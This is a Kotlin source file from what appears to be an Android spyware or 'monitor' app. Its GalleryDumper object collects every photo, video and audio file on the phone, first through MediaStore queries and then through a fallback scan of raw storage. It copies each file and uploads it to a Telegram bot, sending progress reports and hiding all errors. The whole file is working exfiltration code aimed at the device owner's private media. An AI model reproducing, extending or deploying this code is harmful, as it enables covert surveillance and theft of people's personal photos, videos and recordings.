package com.dec.monitor.media

import android.content.Context
import android.os.Build
import android.os.Environment
import android.provider.MediaStore
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File

object GalleryDumper {

    // count = -1 full, -2 half
    suspend fun sendLatest(context: Context, count: Int) = withContext(Dispatchers.IO) {
        val files = getAllMediaFiles(context)

        if (files.isEmpty()) {
            TelegramBot.sendMessage("🖼 No media found — trying direct scan...")
            sendFromDirectScan(context, count)
            return@withContext
        }

        val limit = when (count) {
            -1 -> files.size
            -2 -> files.size / 2
            else -> count
        }

        val toSend = files.take(limit)
        TelegramBot.sendMessage("📦 Syncing ${toSend.size} of ${files.size} files...")

        var sent = 0
        var failed = 0
        for (file in toSend) {
            try {
                when {
                    file.extension.lowercase() in listOf("jpg", "jpeg", "png", "gif", "webp", "bmp") -> {
                        val copy = File(context.cacheDir, "m_${file.name}")
                        file.copyTo(copy, overwrite = true)
                        TelegramBot.sendPhoto(copy, "🖼 ${file.name}")
                    }
                    file.extension.lowercase() in listOf("mp4", "mkv", "avi", "mov", "3gp") -> {
                        val copy = File(context.cacheDir, "m_${file.name}")
                        file.copyTo(copy, overwrite = true)
                        TelegramBot.sendDocument(copy, "🎬 ${file.name}")
                    }
                    file.extension.lowercase() in listOf("mp3", "aac", "wav", "ogg", "m4a", "flac") -> {
                        val copy = File(context.cacheDir, "m_${file.name}")
                        file.copyTo(copy, overwrite = true)
                        TelegramBot.sendAudio(copy, "🎵 ${file.name}")
                    }
                    else -> {
                        val copy = File(context.cacheDir, "m_${file.name}")
                        file.copyTo(copy, overwrite = true)
                        TelegramBot.sendDocument(copy, "📄 ${file.name}")
                    }
                }
                sent++
                if (sent % 10 == 0) {
                    TelegramBot.sendMessage("📦 Progress: $sent/${toSend.size} sent")
                }
            } catch (e: Exception) {
                failed++
            }
        }

        TelegramBot.sendMessage("✅ Sync complete — $sent sent, $failed failed")
    }

    private fun getAllMediaFiles(context: Context): List<File> {
        val files = mutableListOf<File>()
        val seen = mutableSetOf<String>()

        // images
        try {
            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_ADDED),
                null, null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val path = it.getString(0) ?: continue
                    if (path !in seen) {
                        seen.add(path)
                        val f = File(path)
                        if (f.exists()) files.add(f)
                    }
                }
            }
        } catch (e: Exception) { }

        // videos
        try {
            val cursor = context.contentResolver.query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Video.Media.DATA, MediaStore.Video.Media.DATE_ADDED),
                null, null,
                "${MediaStore.Video.Media.DATE_ADDED} DESC"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val path = it.getString(0) ?: continue
                    if (path !in seen) {
                        seen.add(path)
                        val f = File(path)
                        if (f.exists()) files.add(f)
                    }
                }
            }
        } catch (e: Exception) { }

        // audio
        try {
            val cursor = context.contentResolver.query(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Audio.Media.DATA, MediaStore.Audio.Media.DATE_ADDED),
                null, null,
                "${MediaStore.Audio.Media.DATE_ADDED} DESC"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val path = it.getString(0) ?: continue
                    if (path !in seen) {
                        seen.add(path)
                        val f = File(path)
                        if (f.exists()) files.add(f)
                    }
                }
            }
        } catch (e: Exception) { }

        return files
    }

    // fallback — direct filesystem scan
    private suspend fun sendFromDirectScan(context: Context, count: Int) {
        val roots = mutableListOf<File>()

        // try all possible storage paths
        roots.add(Environment.getExternalStorageDirectory())
        context.getExternalFilesDirs(null).forEach { it?.parentFile?.parentFile?.parentFile?.parentFile?.let { r -> roots.add(r) } }

        val mediaExtensions = setOf(
            "jpg", "jpeg", "png", "gif", "webp", "bmp",
            "mp4", "mkv", "avi", "mov", "3gp",
            "mp3", "aac", "wav", "ogg", "m4a"
        )

        val found = mutableListOf<File>()
        for (root in roots) {
            try {
                root.walkTopDown()
                    .filter { it.isFile && it.extension.lowercase() in mediaExtensions }
                    .forEach { found.add(it) }
            } catch (e: Exception) { }
        }

        if (found.isEmpty()) {
            TelegramBot.sendMessage("❌ No media found anywhere — check storage permissions")
            return
        }

        found.sortByDescending { it.lastModified() }

        val limit = when (count) {
            -1 -> found.size
            -2 -> found.size / 2
            else -> count
        }

        TelegramBot.sendMessage("📦 Direct scan found ${found.size} files — sending $limit...")

        var sent = 0
        for (file in found.take(limit)) {
            try {
                val copy = File(context.cacheDir, "ds_${file.name}")
                file.copyTo(copy, overwrite = true)
                when (file.extension.lowercase()) {
                    in listOf("jpg", "jpeg", "png", "gif", "webp") -> TelegramBot.sendPhoto(copy, "🖼 ${file.name}")
                    in listOf("mp3", "aac", "wav", "ogg", "m4a") -> TelegramBot.sendAudio(copy, "🎵 ${file.name}")
                    else -> TelegramBot.sendDocument(copy, "📄 ${file.name}")
                }
                sent++
            } catch (e: Exception) { }
        }

        TelegramBot.sendMessage("✅ Done — $sent files sent")
    }
}
